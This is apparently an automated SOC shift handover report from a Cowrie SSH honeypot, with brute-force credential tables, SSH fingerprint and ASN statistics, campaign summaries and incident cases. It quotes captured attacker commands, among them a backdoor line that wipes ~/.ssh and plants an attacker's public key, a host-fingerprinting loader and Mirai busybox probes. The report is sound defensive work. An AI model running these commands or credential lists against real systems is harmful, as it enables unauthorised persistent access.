# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-09 |
| **Generated At** | 2026-07-09T21:39:18Z |
| **Shift Time** | 21:39 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **362** |
| Confirmed Threats | **340** |
| False Positives Filtered | **22** (6.1%) |
| Unique Attacker IPs | **78** |
| Countries of Origin | **23** |
| High Severity Cases | **165** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **197** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **204** |
| Unique Credential Pairs | **149** |
| Unique Usernames | **46** |
| Unique Passwords | **130** |
| Successful Auth Pairs | **184** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `admin` | 46 |
| `root` | 35 |
| `support` | 9 |
| `ubuntu` | 8 |
| `345gs5662d34` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 9 |
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 8 |
| `` | 7 |
| `support12` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 8 |
| `admin` | `admin` | 6 |
| `root` | `` | 5 |
| `support` | `support12` | 5 |
| `postgres` | `postgres` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `rootpass` | `91.92.40.12` | 2026-07-09T18:55:26 |
| `root` | `rootpw` | `91.92.40.12` | 2026-07-09T18:56:52 |
| `user` | `user10` | `178.178.222.57` | 2026-07-09T18:57:48 |
| `user` | `user10` | `103.171.39.147` | 2026-07-09T18:58:03 |
| `user` | `user10` | `10.0.0.73` | 2026-07-09T18:58:14 |
| `root` | `rootroot` | `91.92.40.12` | 2026-07-09T18:58:17 |
| `root` | `system` | `91.92.40.12` | 2026-07-09T18:59:39 |
| `admin` | `admin` | `65.20.134.97` | 2026-07-09T19:00:08 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `47.254.44.103` | 2026-07-09T19:00:25 |
| `root` | `qiugaoqs123` | `45.198.224.120` | 2026-07-09T19:00:58 |
| `root` | `toor` | `91.92.40.12` | 2026-07-09T19:01:03 |
| `root` | `welcome` | `91.92.40.12` | 2026-07-09T19:02:26 |
| `ubuntu` | `debian` | `185.242.3.195` | 2026-07-09T19:02:47 |
| `unknown` | `7777777777` | `85.19.195.12` | 2026-07-09T19:03:28 |
| `unknown` | `7777777777` | `129.222.172.38` | 2026-07-09T19:03:36 |
| `admin` | `admin` | `218.95.73.31` | 2026-07-09T19:03:48 |
| `admin` | `000000` | `91.92.40.12` | 2026-07-09T19:03:50 |
| `admin` | `111111` | `91.92.40.12` | 2026-07-09T19:05:13 |
| `admin` | `123123` | `91.92.40.12` | 2026-07-09T19:06:35 |
| `admin` | `123321` | `91.92.40.12` | 2026-07-09T19:07:58 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `162.216.150.43` | 2026-07-09T19:08:42 |
| `admin` | `1234` | `91.92.40.12` | 2026-07-09T19:09:23 |
| `admin` | `12345` | `91.92.40.12` | 2026-07-09T19:10:44 |
| `admin` | `123456` | `91.92.40.12` | 2026-07-09T19:12:04 |
| `admin` | `1234567` | `91.92.40.12` | 2026-07-09T19:13:26 |
| `admin` | `12345678` | `91.92.40.12` | 2026-07-09T19:14:43 |
| `admin` | `123456789` | `91.92.40.12` | 2026-07-09T19:16:00 |
| `root` | `` | `64.89.161.91` | 2026-07-09T19:16:31 |
| `root` | `ff123456` | `64.89.161.91` | 2026-07-09T19:16:40 |
| `12345678` | `log` | `64.89.161.91` | 2026-07-09T19:16:48 |
| `orangepi` | `orangepi` | `64.89.161.91` | 2026-07-09T19:16:57 |
| `parrot` | `` | `64.89.161.91` | 2026-07-09T19:17:07 |
| `user3` | `1234` | `64.89.161.91` | 2026-07-09T19:17:15 |
| `admin` | `1234567890` | `91.92.40.12` | 2026-07-09T19:17:17 |
| `anonymous` | `` | `64.89.161.91` | 2026-07-09T19:17:24 |
| `postgres` | `postgres` | `64.89.161.91` | 2026-07-09T19:17:38 |
| `admin` | `123456a` | `91.92.40.12` | 2026-07-09T19:18:33 |
| `ubuntu` | `debian` | `10.0.0.73` | 2026-07-09T19:18:47 |
| `admin` | `123qwe` | `91.92.40.12` | 2026-07-09T19:19:54 |
| `support` | `support12` | `172.90.128.97` | 2026-07-09T19:19:55 |
| `support` | `support12` | `124.88.174.143` | 2026-07-09T19:20:05 |
| `ubuntu` | `upload1234567` | `45.198.224.120` | 2026-07-09T19:21:11 |
| `admin` | `1q2w3e4r` | `91.92.40.12` | 2026-07-09T19:21:16 |
| `ubnt` | `ubnt6` | `207.254.22.207` | 2026-07-09T19:22:25 |
| `admin` | `21` | `91.92.40.12` | 2026-07-09T19:22:36 |
| `ubnt` | `ubnt6` | `196.219.93.108` | 2026-07-09T19:22:37 |
| `support` | `support12` | `182.135.63.175` | 2026-07-09T19:23:26 |
| `support` | `support12` | `10.0.0.73` | 2026-07-09T19:23:50 |
| `admin` | `321` | `91.92.40.12` | 2026-07-09T19:23:59 |
| `admin` | `654321` | `91.92.40.12` | 2026-07-09T19:25:21 |
| `supervisor` | `password321` | `111.70.32.2` | 2026-07-09T19:25:32 |
| `supervisor` | `password321` | `221.224.159.218` | 2026-07-09T19:25:41 |
| `admin` | `7777777` | `91.92.40.12` | 2026-07-09T19:26:39 |
| `admin` | `Admin123` | `91.92.40.12` | 2026-07-09T19:27:56 |
| `supervisor` | `password321` | `211.228.97.97` | 2026-07-09T19:28:59 |
| `admin` | `Admin@123` | `91.92.40.12` | 2026-07-09T19:29:15 |
| `debian` | `debian00` | `10.0.0.73` | 2026-07-09T19:29:51 |
| `admin` | `P@ssw0rd` | `91.92.40.12` | 2026-07-09T19:30:37 |
| `admin` | `abc123` | `91.92.40.12` | 2026-07-09T19:31:57 |
| `admin` | `admin` | `91.92.40.12` | 2026-07-09T19:33:15 |
| `admin` | `admin#123` | `91.92.40.12` | 2026-07-09T19:34:34 |
| `admin` | `admin1` | `91.92.40.12` | 2026-07-09T19:35:57 |
| `ubuntu` | `ubuntu!@#` | `185.242.3.195` | 2026-07-09T19:36:47 |
| `admin` | `admin12` | `91.92.40.12` | 2026-07-09T19:37:18 |
| `admin` | `admin123` | `91.92.40.12` | 2026-07-09T19:38:38 |
| `admin` | `admin2024` | `91.92.40.12` | 2026-07-09T19:39:56 |
| `root` | `Pass@word!@#123` | `45.198.224.120` | 2026-07-09T19:41:13 |
| `admin` | `admin2025` | `91.92.40.12` | 2026-07-09T19:41:14 |
| `admin` | `admin2026` | `91.92.40.12` | 2026-07-09T19:42:31 |
| `admin` | `admin@123` | `91.92.40.12` | 2026-07-09T19:43:46 |
| `admin` | `adminadmin` | `91.92.40.12` | 2026-07-09T19:45:02 |
| `blank` | `blank77` | `65.20.217.64` | 2026-07-09T19:45:21 |
| `admin` | `letmein` | `91.92.40.12` | 2026-07-09T19:46:17 |
| `admin` | `pa$w0rd` | `91.92.40.12` | 2026-07-09T19:47:35 |
| `postgres` | `postgres` | `103.120.116.162` | 2026-07-09T19:47:42 |
| `postgres` | `postgres` | `10.0.0.73` | 2026-07-09T19:48:05 |
| `blank` | `blank77` | `218.25.233.22` | 2026-07-09T19:48:47 |
| `admin` | `pass123` | `91.92.40.12` | 2026-07-09T19:48:53 |
| `ws` | `ws!@#` | `5.253.59.68` | 2026-07-09T19:49:24 |
| `345gs5662d34` | `345gs5662d34` | `5.253.59.68` | 2026-07-09T19:49:26 |
| `ws` | `3245gs5662d34` | `5.253.59.68` | 2026-07-09T19:49:27 |
| `admin` | `passw0rd` | `91.92.40.12` | 2026-07-09T19:50:14 |
| `support` | `support` | `176.53.159.196` | 2026-07-09T19:50:54 |
| `supervisor` | `5555555` | `208.96.233.67` | 2026-07-09T19:51:21 |
| `admin` | `password` | `91.92.40.12` | 2026-07-09T19:51:31 |
| `support` | `support` | `10.0.0.73` | 2026-07-09T19:52:14 |
| `ubuntu` | `ubuntu!@#` | `10.0.0.73` | 2026-07-09T19:52:25 |
| `root` | `lauren` | `45.198.224.120` | 2026-07-09T19:52:39 |
| `admin` | `password1` | `91.92.40.12` | 2026-07-09T19:52:49 |
| `config` | `config7` | `221.199.172.66` | 2026-07-09T19:53:29 |
| `config` | `config7` | `10.0.0.73` | 2026-07-09T19:53:48 |
| `admin` | `qwerty` | `91.92.40.12` | 2026-07-09T19:54:04 |
| `supervisor` | `5555555` | `10.0.0.73` | 2026-07-09T19:55:06 |
| `admin` | `root` | `91.92.40.12` | 2026-07-09T19:55:22 |
| `admin` | `root123` | `91.92.40.12` | 2026-07-09T19:56:41 |
| `root` | `1234qwerasdf` | `180.74.91.50` | 2026-07-09T19:56:41 |
| `345gs5662d34` | `345gs5662d34` | `180.74.91.50` | 2026-07-09T19:56:45 |
| `root` | `3245gs5662d34` | `180.74.91.50` | 2026-07-09T19:56:47 |
| `ansible` | `ansible` | `91.92.40.12` | 2026-07-09T19:57:56 |
| `ansible` | `ansible123` | `91.92.40.12` | 2026-07-09T19:59:14 |
| `apache` | `P@ssw0rd` | `91.92.40.12` | 2026-07-09T20:00:31 |
| `apache` | `admin` | `91.92.40.12` | 2026-07-09T20:01:49 |
| `root` | `admin` | `185.220.101.107` | 2026-07-09T20:03:10 |
| `apache` | `apache` | `91.92.40.12` | 2026-07-09T20:03:11 |
| `oracle` | `oracle` | `45.198.224.120` | 2026-07-09T20:03:56 |
| `backup` | `archive` | `91.92.40.12` | 2026-07-09T20:04:32 |
| `backup` | `backup` | `91.92.40.12` | 2026-07-09T20:05:50 |
| `backup` | `backup123` | `91.92.40.12` | 2026-07-09T20:07:08 |
| `centos` | `centos` | `91.92.40.12` | 2026-07-09T20:08:26 |
| `root` | `qweASD!@#` | `185.242.3.195` | 2026-07-09T20:09:09 |
| `debian` | `debian` | `91.92.40.12` | 2026-07-09T20:09:44 |
| `root` | `` | `94.154.43.41` | 2026-07-09T20:10:00 |
| `debian` | `debian2026` | `91.92.40.12` | 2026-07-09T20:11:01 |
| `deploy` | `deploy` | `91.92.40.12` | 2026-07-09T20:12:18 |
| `telecomadmin` | `admintelecom` | `10.0.0.73` | 2026-07-09T20:13:23 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-09T20:13:38 |
| `deploy` | `deploy123` | `91.92.40.12` | 2026-07-09T20:13:41 |
| `supervisor` | `P@ssword` | `10.0.0.73` | 2026-07-09T20:14:39 |
| `Unknown` | `22222222` | `175.206.1.60` | 2026-07-09T20:15:02 |
| `deploy` | `deploy2026` | `91.92.40.12` | 2026-07-09T20:15:03 |
| `ubuntu` | `a1b2c3d4e5` | `45.198.224.120` | 2026-07-09T20:15:06 |
| `dev` | `dev` | `91.92.40.12` | 2026-07-09T20:16:26 |
| `dev` | `dev123` | `91.92.40.12` | 2026-07-09T20:17:47 |
| `Unknown` | `22222222` | `10.0.0.73` | 2026-07-09T20:18:59 |
| `developer` | `developer` | `91.92.40.12` | 2026-07-09T20:19:09 |
| `ec2-user` | `amazon` | `91.92.40.12` | 2026-07-09T20:20:26 |
| `root` | `1233218613f` | `10.0.0.73` | 2026-07-09T20:20:29 |
| `ec2-user` | `ec2-user` | `91.92.40.12` | 2026-07-09T20:21:38 |
| `elastic` | `elastic` | `91.92.40.12` | 2026-07-09T20:22:53 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-09T20:23:50 |
| `root` | `qweASD!@#` | `10.0.0.73` | 2026-07-09T20:24:09 |
| `elasticsearch` | `elasticsearch` | `91.92.40.12` | 2026-07-09T20:24:12 |
| `fedora` | `fedora` | `91.92.40.12` | 2026-07-09T20:25:34 |
| `root` | `Qazxsw21` | `45.198.224.120` | 2026-07-09T20:26:38 |
| `ftp` | `anonymous` | `91.92.40.12` | 2026-07-09T20:27:00 |
| `ftp` | `ftp` | `91.92.40.12` | 2026-07-09T20:28:29 |
| `ftp` | `ftpuser` | `91.92.40.12` | 2026-07-09T20:30:01 |
| `git` | `P@ssw0rd` | `91.92.40.12` | 2026-07-09T20:31:31 |
| `git` | `admin` | `91.92.40.12` | 2026-07-09T20:33:02 |
| `root` | `abc@2022` | `10.0.0.73` | 2026-07-09T20:33:32 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-09T20:33:34 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-09T20:33:35 |
| `git` | `git` | `91.92.40.12` | 2026-07-09T20:34:35 |
| `centos` | `centos123456789` | `41.231.85.75` | 2026-07-09T20:35:00 |
| `centos` | `centos123456789` | `61.12.86.90` | 2026-07-09T20:35:08 |
| `git` | `git123` | `91.92.40.12` | 2026-07-09T20:36:07 |
| `guest` | `P@ssw0rd` | `91.92.40.12` | 2026-07-09T20:37:28 |
| `suliyilei1` | `suliyilei1` | `45.198.224.120` | 2026-07-09T20:38:08 |
| `guest` | `guest` | `91.92.40.12` | 2026-07-09T20:38:45 |
| `centos` | `centos123456789` | `10.0.0.73` | 2026-07-09T20:39:01 |
| `guest` | `guest123` | `91.92.40.12` | 2026-07-09T20:40:01 |
| `guest` | `welcome` | `91.92.40.12` | 2026-07-09T20:41:18 |
| `jenkins` | `jenkins` | `91.92.40.12` | 2026-07-09T20:42:39 |
| `user` | `resu` | `185.242.3.195` | 2026-07-09T20:42:46 |
| `guest` | `qwerty1` | `117.250.19.91` | 2026-07-09T20:43:03 |
| `minecraft` | `minecraft` | `91.92.40.12` | 2026-07-09T20:43:58 |
| `hussain` | `hussain` | `139.59.45.165` | 2026-07-09T20:44:00 |
| `345gs5662d34` | `345gs5662d34` | `139.59.45.165` | 2026-07-09T20:44:03 |
| `hussain` | `3245gs5662d34` | `139.59.45.165` | 2026-07-09T20:44:05 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-09T20:44:31 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-09T20:44:32 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-09T20:44:37 |
| `root` | `Admin_123!` | `83.171.89.209` | 2026-07-09T20:45:12 |
| `345gs5662d34` | `345gs5662d34` | `83.171.89.209` | 2026-07-09T20:45:15 |
| `root` | `3245gs5662d34` | `83.171.89.209` | 2026-07-09T20:45:16 |
| `minecraft` | `server` | `91.92.40.12` | 2026-07-09T20:45:23 |
| `unknown` | `default` | `111.70.23.238` | 2026-07-09T20:45:39 |
| `unknown` | `default` | `41.231.85.75` | 2026-07-09T20:45:48 |
| `unknown` | `default` | `10.0.0.73` | 2026-07-09T20:46:12 |
| `mysql` | `mysql` | `91.92.40.12` | 2026-07-09T20:46:45 |
| `mysql` | `mysql1` | `91.92.40.12` | 2026-07-09T20:48:08 |
| `paco` | `paco` | `10.0.0.73` | 2026-07-09T20:48:54 |
| `paco` | `3245gs5662d34` | `10.0.0.73` | 2026-07-09T20:48:58 |
| `mysql` | `mysql123` | `91.92.40.12` | 2026-07-09T20:49:35 |
| `root` | `Oracle123!@#` | `45.198.224.120` | 2026-07-09T20:49:49 |
| `no-reply` | `123456` | `10.0.0.73` | 2026-07-09T20:50:32 |
| `no-reply` | `3245gs5662d34` | `10.0.0.73` | 2026-07-09T20:50:35 |
| `mysql` | `root` | `91.92.40.12` | 2026-07-09T20:51:01 |
| `nagios` | `nagios` | `91.92.40.12` | 2026-07-09T20:52:24 |
| `ems` | `ems123` | `10.0.0.73` | 2026-07-09T20:53:33 |
| `ems` | `3245gs5662d34` | `10.0.0.73` | 2026-07-09T20:53:39 |
| `nagios` | `nagios123` | `91.92.40.12` | 2026-07-09T20:53:48 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-09T20:54:11 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-09T20:54:11 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **362** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 114 |
| libssh | 31 |
| OpenSSH | 26 |
| Paramiko (Python) | 6 |
| Perl Net::SSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 89 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 25 | 24 |
| `16443846184e...` | Generic scanner | 17 | 2 |
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `4ed0d5b0dc3b...` | Mirai/variant | 9 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 89 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 25 | 24 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 17 | 2 | Generic scanner |
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 10 | 4 | — |
| `4ed0d5b0dc3b...` | libssh | 9 | 1 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 89 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `91.92.40.12`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.41`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `180.74.91.50`, `83.171.89.209`, `5.253.59.68`, `139.59.45.165`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **78** |
| Unique ASNs | **44** |
| High-Risk ASNs | **40** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 8 | HIGH |
| `AS46562` | Performive LLC | 6 | MEDIUM |
| `AS213412` | ONYPHE SAS | 6 | HIGH |
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (164)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-25d95f3998ac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:55 |
| **Last Seen** | 2026-07-09 18:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:55:25` | `cowrie.session.connect` |
| `2026-07-09 18:55:25` | `cowrie.client.version` |
| `2026-07-09 18:55:25` | `cowrie.client.kex` |
| `2026-07-09 18:55:26` | `cowrie.login.success` |
| `2026-07-09 18:55:28` | `cowrie.session.params` |
| `2026-07-09 18:55:28` | `cowrie.command.input` |
| `2026-07-09 18:55:28` | `cowrie.command.input` |
| `2026-07-09 18:55:28` | `cowrie.command.input` |
| `2026-07-09 18:55:28` | `cowrie.command.input` |
| `2026-07-09 18:55:28` | `cowrie.command.input` |
| `2026-07-09 18:55:28` | `cowrie.command.success` |
| `2026-07-09 18:55:28` | `cowrie.command.input` |
| `2026-07-09 18:55:28` | `cowrie.command.input` |
| `2026-07-09 18:55:28` | `cowrie.command.input` |
| `2026-07-09 18:55:28` | `cowrie.command.input` |
| `2026-07-09 18:55:28` | `cowrie.log.closed` |
| `2026-07-09 18:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a33f666719f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:56 |
| **Last Seen** | 2026-07-09 18:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:56:51` | `cowrie.session.connect` |
| `2026-07-09 18:56:51` | `cowrie.client.version` |
| `2026-07-09 18:56:51` | `cowrie.client.kex` |
| `2026-07-09 18:56:52` | `cowrie.login.success` |
| `2026-07-09 18:56:53` | `cowrie.session.params` |
| `2026-07-09 18:56:53` | `cowrie.command.input` |
| `2026-07-09 18:56:53` | `cowrie.command.input` |
| `2026-07-09 18:56:53` | `cowrie.command.input` |
| `2026-07-09 18:56:53` | `cowrie.command.input` |
| `2026-07-09 18:56:53` | `cowrie.command.input` |
| `2026-07-09 18:56:53` | `cowrie.command.success` |
| `2026-07-09 18:56:53` | `cowrie.command.input` |
| `2026-07-09 18:56:53` | `cowrie.command.input` |
| `2026-07-09 18:56:53` | `cowrie.command.input` |
| `2026-07-09 18:56:53` | `cowrie.command.input` |
| `2026-07-09 18:56:54` | `cowrie.log.closed` |
| `2026-07-09 18:56:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bf3efc2f6b0

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]57` |
| **First Seen** | 2026-07-09 18:57 |
| **Last Seen** | 2026-07-09 18:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:57:46` | `cowrie.session.connect` |
| `2026-07-09 18:57:47` | `cowrie.client.version` |
| `2026-07-09 18:57:47` | `cowrie.client.kex` |
| `2026-07-09 18:57:48` | `cowrie.login.success` |
| `2026-07-09 18:57:49` | `cowrie.direct-tcpip.request` |
| `2026-07-09 18:57:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]57` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]57` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab8c7efc812d

| Field | Detail |
|---|---|
| **Source IP** | `103.171.39[.]147` |
| **First Seen** | 2026-07-09 18:58 |
| **Last Seen** | 2026-07-09 18:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:58:00` | `cowrie.session.connect` |
| `2026-07-09 18:58:01` | `cowrie.client.version` |
| `2026-07-09 18:58:01` | `cowrie.client.kex` |
| `2026-07-09 18:58:03` | `cowrie.login.success` |
| `2026-07-09 18:58:04` | `cowrie.direct-tcpip.request` |
| `2026-07-09 18:58:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.39[.]147` to AbuseIPDB if not already reported
- [ ] Block `103.171.39[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34871d872cd0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:58 |
| **Last Seen** | 2026-07-09 18:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
